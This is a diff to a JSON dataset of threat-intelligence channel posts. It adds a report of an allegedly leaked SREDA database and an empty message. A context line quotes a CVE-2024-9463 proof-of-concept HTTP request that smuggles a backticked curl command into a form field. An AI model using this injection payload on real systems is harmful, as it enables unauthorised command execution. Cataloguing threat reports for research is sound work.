@@ -17636,6 +17636,18 @@
             "URLs": [
                 "ps://darkwebinformer.com/anonpioneers-targeted-the-website-of-honest-builders-developers-pvt-ltd/"
             ]
+        },
+        {
+            "Message ID": 5474,
+            "Date": "2024-10-15",
+            "Content": "🚨🇧🇩A Threat Actor has Allegedly Leaked the Database of SREDA\n\nhttps://darkwebinformer.com/a-threat-actor-has-allegedly-leaked-the-database-of-sreda/",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "ps://darkwebinformer.com/a-threat-actor-has-allegedly-leaked-the-database-of-sreda/"
+            ]
         }
     ],
     "RipperSec | РипперСек": [
@@ -22902,6 +22914,16 @@
             "Message ID": 2295,
             "Date": "2024-10-15",
             "Content": "CVE-2024-9463\n\nPOST /API/convertCSVtoParquet.php HTTP/1.1\nHost: \nContent-Type: application/x-www-form-urlencoded\n \nram=watchTowr`curl+`",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2296,
+            "Date": "2024-10-15",
+            "Content": "",
             "Attack Type": "Unknown",
             "Location": [
                 "N/A"
